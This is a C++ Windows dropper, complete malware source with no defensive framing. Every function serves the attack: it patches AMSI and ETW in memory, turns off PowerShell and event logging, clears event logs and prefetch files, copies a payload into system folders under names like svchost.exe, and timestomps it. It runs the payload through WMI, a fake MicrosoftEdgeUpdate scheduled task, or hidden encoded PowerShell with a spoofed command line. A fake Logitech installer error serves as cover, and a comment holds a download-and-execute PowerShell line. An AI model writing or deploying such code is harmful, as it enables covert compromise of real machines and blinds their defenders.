#include <windows.h>
#include <string>
#include <vector>
#include <random>
#include <ctime>
#include <algorithm>
#include <wincrypt.h>
#include <comdef.h>
#include <taskschd.h>
#include <Wbemidl.h>
#include <winternl.h>
#include <thread>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "wbemuuid.lib")

// Change this to false when you want full silent mode
#define DEBUG_MODE false

#define CW_ENABLE_STRING_ENCRYPTION 1
#define CW_ENABLE_VALUE_OBFUSCATION 1
#define CW_KERNEL_MODE 0
#define CW_ENABLE_ANTI_VM 1
#define CW_ENABLE_IMPORT_HIDING 1
#define CW_ENABLE_INTEGRITY_CHECKS 1
#define CW_ENABLE_COMPILE_TIME_RANDOM 1
#define CW_ANTI_DEBUG_RESPONSE 1

#include "../headers/cloakwork.h"
#include "../headers/xorstr.hpp"

void DebugPrint(const std::wstring& msg) {
    if (!DEBUG_MODE) return;
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_SHOW);
    wprintf(L"[DEBUG] %s\n", msg.c_str());
}

void KillAMSI() {
    SetEnvironmentVariableW(xorstr_(L"AMSI_TEST"), xorstr_(L"1"));
    HMODULE amsi = LoadLibraryW(xorstr_(L"amsi.dll"));
    if (!amsi) return;
    auto scan = GetProcAddress(amsi, xorstr_("AmsiScanBuffer"));
    if (!scan) return;
    DWORD old;
    VirtualProtect(scan, 32, PAGE_EXECUTE_READWRITE, &old);
    BYTE patch[] = { 0x33, 0xC0, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90 };
    memcpy(scan, patch, sizeof(patch));
    VirtualProtect(scan, 32, old, &old);
    FlushInstructionCache(GetCurrentProcess(), scan, 32);
}

void KillETW() {
    HMODULE ntdll = GetModuleHandleW(xorstr_(L"ntdll.dll"));
    if (!ntdll) return;
    const char* etwFunctions[] = {
        xorstr_("EtwEventWrite"), xorstr_("EtwEventWriteFull"), xorstr_("EtwEventWriteEx"),
        xorstr_("EtwEventWriteString"), xorstr_("EtwEventWriteTransfer"), xorstr_("EtwNotificationRegister")
    };
    BYTE patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
    for (const char* funcName : etwFunctions) {
        auto func = reinterpret_cast<BYTE*>(GetProcAddress(ntdll, funcName));
        if (!func) continue;
        DWORD old;
        if (VirtualProtect(func, sizeof(patch), PAGE_EXECUTE_READWRITE, &old)) {
            memcpy(func, patch, sizeof(patch));
            VirtualProtect(func, sizeof(patch), old, &old);
            FlushInstructionCache(GetCurrentProcess(), func, sizeof(patch));
        }
    }
}

void KillPowerShellLogging() {
    HKEY hKey;
    DWORD dwValue = 4;
    DWORD dwZero = 0;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, xorstr_(L"SYSTEM\\CurrentControlSet\\Services\\EventLog"), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, xorstr_(L"Start"), 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    const wchar_t* keys[] = {
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging",
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription"
    };
    for (auto k : keys) {
        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, k, 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, xorstr_(L"EnableScriptBlockLogging"), 0, REG_DWORD, (BYTE*)&dwZero, sizeof(DWORD));
            RegSetValueExW(hKey, xorstr_(L"EnableModuleLogging"), 0, REG_DWORD, (BYTE*)&dwZero, sizeof(DWORD));
            RegSetValueExW(hKey, xorstr_(L"EnableTranscripting"), 0, REG_DWORD, (BYTE*)&dwZero, sizeof(DWORD));
            RegCloseKey(hKey);
        }
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, xorstr_(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit"), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, xorstr_(L"ProcessCreationIncludeCmdLine_Enabled"), 0, REG_DWORD, (BYTE*)&dwZero, sizeof(DWORD));
        RegCloseKey(hKey);
    }
}


void DisableEventLogging() {
    HKEY hKey;
    DWORD dwValue = 4;
    DWORD dwZero = 0;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, xorstr_(L"SYSTEM\\CurrentControlSet\\Services\\EventLog"), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, xorstr_(L"Start"), 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, xorstr_(L"SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging"), 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, xorstr_(L"EnableScriptBlockLogging"), 0, REG_DWORD, (BYTE*)&dwZero, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, xorstr_(L"SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging"), 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, xorstr_(L"EnableModuleLogging"), 0, REG_DWORD, (BYTE*)&dwZero, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, xorstr_(L"SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription"), 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, xorstr_(L"EnableTranscripting"), 0, REG_DWORD, (BYTE*)&dwZero, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, xorstr_(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit"), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, xorstr_(L"ProcessCreationIncludeCmdLine_Enabled"), 0, REG_DWORD, (BYTE*)&dwZero, sizeof(DWORD));
        RegCloseKey(hKey);
    }
}

void ClearEventLogs() {
    const wchar_t* logs[] = {
        xorstr_(L"System"), xorstr_(L"Security"), xorstr_(L"Application"),
        xorstr_(L"Microsoft-Windows-PowerShell/Operational"),
        xorstr_(L"Microsoft-Windows-PowerShell/Admin"),
        xorstr_(L"Windows PowerShell"),
        xorstr_(L"Microsoft-Windows-TaskScheduler/Operational"),
        xorstr_(L"Microsoft-Windows-WMI-Activity/Operational")
    };
    for (const wchar_t* logName : logs) {
        HANDLE hEventLog = OpenEventLogW(NULL, logName);
        if (hEventLog) {
            ClearEventLogW(hEventLog, NULL);
            CloseEventLog(hEventLog);
        }
    }
}

void DisablePrefetch() {
    HKEY hKey;
    DWORD dwValue = 0;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, xorstr_(L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters"), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, xorstr_(L"EnablePrefetcher"), 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        RegSetValueExW(hKey, xorstr_(L"EnableSuperfetch"), 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        RegCloseKey(hKey);
    }
}

void DeletePrefetchFiles() {
    std::wstring prefetchPath = xorstr_(L"C:\\Windows\\Prefetch\\*.pf");
    std::wstring prefetchDir = xorstr_(L"C:\\Windows\\Prefetch\\");
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(prefetchPath.c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            std::wstring filePath = prefetchDir + findData.cFileName;
            DeleteFileW(filePath.c_str());
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
}

void DisableETW() {
    HMODULE ntdll = GetModuleHandleW(xorstr_(L"ntdll.dll"));
    if (!ntdll) return;
    const char* etwFunctions[] = {
        xorstr_("EtwEventWrite"), xorstr_("EtwEventWriteFull"), xorstr_("EtwEventWriteEx"),
        xorstr_("EtwEventWriteString"), xorstr_("EtwEventWriteTransfer"), xorstr_("EtwNotificationRegister")
    };
    BYTE patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
    for (const char* funcName : etwFunctions) {
        auto func = reinterpret_cast<BYTE*>(GetProcAddress(ntdll, funcName));
        if (!func) continue;
        DWORD old;
        if (VirtualProtect(func, sizeof(patch), PAGE_EXECUTE_READWRITE, &old)) {
            memcpy(func, patch, sizeof(patch));
            VirtualProtect(func, sizeof(patch), old, &old);
            FlushInstructionCache(GetCurrentProcess(), func, sizeof(patch));
        }
    }
}

void DisableAMSI() {
    SetEnvironmentVariableW(xorstr_(L"AMSI_TEST"), xorstr_(L"1"));
    HMODULE amsi = LoadLibraryW(xorstr_(L"amsi.dll"));
    if (!amsi) return;
    auto scan = GetProcAddress(amsi, xorstr_("AmsiScanBuffer"));
    if (!scan) return;
    DWORD old;
    VirtualProtect(scan, 16, PAGE_EXECUTE_READWRITE, &old);
    BYTE patch[] = { 0x33, 0xC0, 0xC3, 0x90, 0x90, 0x90 };
    memcpy(scan, patch, sizeof(patch));
    VirtualProtect(scan, 16, old, &old);
    FlushInstructionCache(GetCurrentProcess(), scan, 16);
}

bool CopyFileDirect(const std::wstring& source, const std::wstring& destination) {
    DeleteFileW(destination.c_str());
    return CopyFileW(source.c_str(), destination.c_str(), FALSE);
}

void TimestompFile(const std::wstring& target) {
    std::wstring refs[] = {
        xorstr_(L"C:\\Windows\\System32\\notepad.exe"),
        xorstr_(L"C:\\Windows\\explorer.exe"),
        xorstr_(L"C:\\Windows\\regedit.exe")
    };
    FILETIME create{}, access{}, write{};
    bool got = false;
    for (auto& ref : refs) {
        HANDLE h = CreateFileW(ref.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            GetFileTime(h, &create, &access, &write);
            CloseHandle(h);
            got = true;
            break;
        }
    }
    if (!got) return;
    ULARGE_INTEGER ul;
    ul.LowPart = write.dwLowDateTime; ul.HighPart = write.dwHighDateTime;
    ul.QuadPart += (rand() % 1800000000ULL);
    write.dwLowDateTime = ul.LowPart; write.dwHighDateTime = ul.HighPart;
    HANDLE h = CreateFileW(target.c_str(), FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        SetFileTime(h, &create, &access, &write);
        CloseHandle(h);
    }
}

struct PathOption {
    std::wstring directory;
    std::wstring filename;
};

PathOption GetRandomPathOption() {
    std::vector<PathOption> options = {
        { xorstr_(L"C:\\Windows\\System32\\"), xorstr_(L"svchost.exe") },
        { xorstr_(L"C:\\Windows\\SysWOW64\\"), xorstr_(L"dllhost.exe") },
        { xorstr_(L"C:\\Windows\\System32\\wbem\\"), xorstr_(L"wmiprvse.exe") },
        { xorstr_(L"C:\\Windows\\System32\\spool\\drivers\\color\\"), xorstr_(L"spoolsv.exe") },
        { xorstr_(L"C:\\Windows\\System32\\Tasks\\"), xorstr_(L"taskhostw.exe") },
        { xorstr_(L"C:\\Windows\\System32\\DriverStore\\FileRepository\\"), xorstr_(L"svchost.exe") },
        { xorstr_(L"C:\\Windows\\System32\\catroot2\\"), xorstr_(L"cryptsvc.exe") },
        { xorstr_(L"C:\\Windows\\System32\\config\\systemprofile\\"), xorstr_(L"RuntimeBroker.exe") },
        { xorstr_(L"C:\\Windows\\System32\\LogFiles\\"), xorstr_(L"loghost.exe") },
        { xorstr_(L"C:\\Windows\\Temp\\"), xorstr_(L"WerFault.exe") },
        { xorstr_(L"C:\\Windows\\Logs\\CBS\\"), xorstr_(L"cbscore.exe") },
        { xorstr_(L"C:\\Windows\\SoftwareDistribution\\"), xorstr_(L"svchost.exe") },
        { xorstr_(L"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\"), xorstr_(L"MsMpEng.exe") },
        { xorstr_(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\"), xorstr_(L"WerFault.exe") },
        { xorstr_(L"C:\\ProgramData\\Microsoft\\Windows Defender\\"), xorstr_(L"SecurityHealthSystray.exe") },
        { xorstr_(L"%USERPROFILE%\\AppData\\Local\\Temp\\"), xorstr_(L"dllhost.exe") },
        { xorstr_(L"%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\INetCache\\"), xorstr_(L"iexplore.exe") },
        { xorstr_(L"%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\History\\"), xorstr_(L"microsoftedge.exe") },
        { xorstr_(L"C:\\Program Files\\Common Files\\microsoft shared\\"), xorstr_(L"svchost.exe") }
    };
    static std::mt19937 rng(static_cast<unsigned int>(std::time(nullptr)));
    std::shuffle(options.begin(), options.end(), rng);
    PathOption selected = options.front();
    wchar_t expandedPath[MAX_PATH];
    ExpandEnvironmentStringsW(selected.directory.c_str(), expandedPath, MAX_PATH);
    selected.directory = expandedPath;
    return selected;
}

bool ExecuteViaWMI(const std::wstring& fullTarget) {
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    IWbemLocator* pLoc = NULL;
    IWbemServices* pSvc = NULL;
    HRESULT hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hres)) { CoUninitialize(); return false; }
    hres = pLoc->ConnectServer(_bstr_t(xorstr_(L"ROOT\\CIMV2")), NULL, NULL, 0, NULL, 0, 0, &pSvc);
    if (FAILED(hres)) { pLoc->Release(); CoUninitialize(); return false; }
    CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    IWbemClassObject* pClass = NULL;
    hres = pSvc->GetObject(_bstr_t(xorstr_(L"Win32_Process")), 0, NULL, &pClass, NULL);
    if (FAILED(hres)) { pSvc->Release(); pLoc->Release(); CoUninitialize(); return false; }
    IWbemClassObject* pInParamsDefinition = NULL;
    pClass->GetMethod(xorstr_(L"Create"), 0, &pInParamsDefinition, NULL);
    IWbemClassObject* pClassInstance = NULL;
    pInParamsDefinition->SpawnInstance(0, &pClassInstance);
    VARIANT varCommand;
    varCommand.vt = VT_BSTR;
    varCommand.bstrVal = _bstr_t(fullTarget.c_str());
    pClassInstance->Put(xorstr_(L"CommandLine"), 0, &varCommand, 0);
    IWbemClassObject* pOutParams = NULL;
    hres = pSvc->ExecMethod(_bstr_t(xorstr_(L"Win32_Process")), _bstr_t(xorstr_(L"Create")), 0, NULL, pClassInstance, &pOutParams, NULL);
    VariantClear(&varCommand);
    if (pOutParams) pOutParams->Release();
    pClassInstance->Release();
    pInParamsDefinition->Release();
    pClass->Release();
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();
    return SUCCEEDED(hres);
}

bool ExecuteViaTaskScheduler(const std::wstring& fullTarget) {
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    ITaskService* pService = NULL;
    HRESULT hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) { CoUninitialize(); return false; }
    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) { pService->Release(); CoUninitialize(); return false; }
    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(xorstr_(L"\\")), &pRootFolder);
    if (FAILED(hr)) { pService->Release(); CoUninitialize(); return false; }
    ITaskDefinition* pTask = NULL;
    hr = pService->NewTask(0, &pTask);
    if (FAILED(hr)) { pRootFolder->Release(); pService->Release(); CoUninitialize(); return false; }
    IActionCollection* pActionCollection = NULL;
    IAction* pAction = NULL;
    IExecAction* pExecAction = NULL;
    pTask->get_Actions(&pActionCollection);
    pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
    pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
    pExecAction->put_Path(_bstr_t(fullTarget.c_str()));
    IRegisteredTask* pRegisteredTask = NULL;
    std::wstring taskName = xorstr_(L"MicrosoftEdgeUpdate") + std::to_wstring(GetTickCount64());
    hr = pRootFolder->RegisterTaskDefinition(_bstr_t(taskName.c_str()), pTask, TASK_CREATE_OR_UPDATE,
        _variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(xorstr_(L"")), &pRegisteredTask);
    if (SUCCEEDED(hr)) {
        IRunningTask* pRunningTask = NULL;
        pRegisteredTask->Run(_variant_t(), &pRunningTask);
        if (pRunningTask) { Sleep(2000); pRunningTask->Release(); }
        pRootFolder->DeleteTask(_bstr_t(taskName.c_str()), 0);
    }
    if (pRegisteredTask) pRegisteredTask->Release();
    if (pExecAction) pExecAction->Release();
    if (pAction) pAction->Release();
    if (pActionCollection) pActionCollection->Release();
    pTask->Release();
    pRootFolder->Release();
    pService->Release();
    CoUninitialize();
    return SUCCEEDED(hr);
}

void SpoofCommandLine(PROCESS_INFORMATION& pi, const wchar_t* fakeCmd) {
    typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
    HMODULE ntdll = GetModuleHandleW(xorstr_(L"ntdll.dll"));
    if (!ntdll) return;
    auto NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(ntdll, xorstr_("NtQueryInformationProcess"));
    if (!NtQueryInformationProcess) return;
    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG len = 0;
    if (NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), &len) != 0) return;
    PVOID pebAddress = pbi.PebBaseAddress;
    if (!pebAddress) return;
    PVOID rtlUserProcParamsAddress = nullptr;
    SIZE_T bytesRead = 0;
#ifdef _WIN64
    if (!ReadProcessMemory(pi.hProcess, (PCHAR)pebAddress + 0x20, &rtlUserProcParamsAddress, sizeof(PVOID), &bytesRead)) return;
#else
    if (!ReadProcessMemory(pi.hProcess, (PCHAR)pebAddress + 0x10, &rtlUserProcParamsAddress, sizeof(PVOID), &bytesRead)) return;
#endif
    UNICODE_STRING cmdLine = {};
#ifdef _WIN64
    if (!ReadProcessMemory(pi.hProcess, (PCHAR)rtlUserProcParamsAddress + 0x70, &cmdLine, sizeof(cmdLine), &bytesRead)) return;
#else
    if (!ReadProcessMemory(pi.hProcess, (PCHAR)rtlUserProcParamsAddress + 0x40, &cmdLine, sizeof(cmdLine), &bytesRead)) return;
#endif
    size_t fakeCmdLen = wcslen(fakeCmd) * sizeof(wchar_t);
    if (fakeCmdLen > cmdLine.MaximumLength) fakeCmdLen = cmdLine.MaximumLength;
    WriteProcessMemory(pi.hProcess, cmdLine.Buffer, fakeCmd, fakeCmdLen, nullptr);
}

void RandomisedPause() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dist(1000, 5000);
    int delay_ms = dist(gen);
    std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms));
}


int wmain(int argc, wchar_t* argv[]) {

    auto s = CW_STR("superdupersecretfromego1337");
    int k = CW_INT(133742069);

    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);

    if (argc <= 1) {
        HWND hwnd = GetConsoleWindow();
        if (hwnd) ShowWindow(hwnd, SW_HIDE);

        MessageBoxW(NULL,
            xorstr_(L"Logitech Onboard Memory Manager installation failed.\n\n"
                L"The application could not be installed due to missing system components.\n\n"
                L"Usage: dropper.exe <target.exe>"),
            xorstr_(L"Logitech Onboard Memory Manager"),
            MB_OK | MB_ICONERROR);
        return 1;
    }

    RandomisedPause();
    DisableEventLogging();
    DisablePrefetch();
    DeletePrefetchFiles();
    DisableETW();
    DisableAMSI();
    ClearEventLogs();

    SetEnvironmentVariableW(xorstr_(L"PSModulePath"), xorstr_(L""));
    SetEnvironmentVariableW(xorstr_(L"PSExecutionPolicyPreference"), xorstr_(L"Bypass"));

    Sleep(500);

    std::wstring exePath = argv[1];
    SecureZeroMemory(argv[1], wcslen(argv[1]) * sizeof(wchar_t));

    PathOption target = GetRandomPathOption();
    std::wstring fullTarget = target.directory + target.filename;

    int attempts = 0;
    while (!CopyFileDirect(exePath, fullTarget) && attempts < 5) {
        attempts++;
        target = GetRandomPathOption();
        fullTarget = target.directory + target.filename;
    }

    if (attempts >= 5) {
        wchar_t tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        fullTarget = std::wstring(tempPath) + xorstr_(L"svchost_helper.exe");
        CopyFileDirect(exePath, fullTarget);
    }

    TimestompFile(fullTarget);

    // note to self. change this execution method to use the following command from LOLBAS
    // SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('https://www.example.org/file.ps1') | IEX"
    // https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/

    std::wstring innerPayload =
        L"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
        L"try{[System.Diagnostics.Eventing.EventProvider]::new([Guid]::NewGuid()).Dispose()}catch{};"
        L"$p=@{AppId='App';PackageFamilyName='Microsoft.WindowsStore_8wekyb3d8bbwe';"
        L"Command='" + fullTarget + L"';PreventBreakaway=$true};"
        L"Invoke-CommandInDesktopPackage @p | Out-Null;";

    DWORD base64Len = 0;
    CryptBinaryToStringW((BYTE*)innerPayload.c_str(),
        static_cast<DWORD>(innerPayload.length() * sizeof(wchar_t)),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64Len);

    std::wstring base64(base64Len, L'\0');
    CryptBinaryToStringW((BYTE*)innerPayload.c_str(),
        static_cast<DWORD>(innerPayload.length() * sizeof(wchar_t)),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &base64[0], &base64Len);
    base64.resize(base64Len);

    // SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('https://www.example.org/file.ps1') | IEX"

    std::wstring fullCommand =
        //xorstr_(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Sta -Nop -W Hidden -Ep Bypass -Enc ")
        xorstr_(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Sta -Nop -W Hidden -Ep Bypass -Enc ")
        + base64;

    bool executed = false;

    if (ExecuteViaWMI(fullCommand)) {
        executed = true;
        if (DEBUG_MODE) MessageBoxW(NULL, L"Executed via WMI", L"Success", MB_OK);
    }

    else if (ExecuteViaTaskScheduler(fullCommand)) {
        executed = true;
        if (DEBUG_MODE) MessageBoxW(NULL, L"Executed via Task Scheduler", L"Success", MB_OK);
    }

    else {
        STARTUPINFOW si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = {};

        DWORD flags = CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP;

        if (CreateProcessW(NULL, &fullCommand[0], NULL, NULL, FALSE, flags, NULL, NULL, &si, &pi)) {
            SpoofCommandLine(pi, xorstr_(L"C:\\Windows\\System32\\svchost.exe -k LocalService"));
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            executed = true;
            if (DEBUG_MODE) MessageBoxW(NULL, L"Executed via CreateProcess fallback", L"Success", MB_OK);
        }
    }

    ClearEventLogs();
    DeletePrefetchFiles();

    if (DEBUG_MODE) {
        if (executed)
            MessageBoxW(NULL, L"Target should now be running via Store bypass.", L"Status", MB_OK);
        else
            MessageBoxW(NULL, L"Launch failed completely.", L"Error", MB_OK | MB_ICONERROR);
    }

    return 0;
}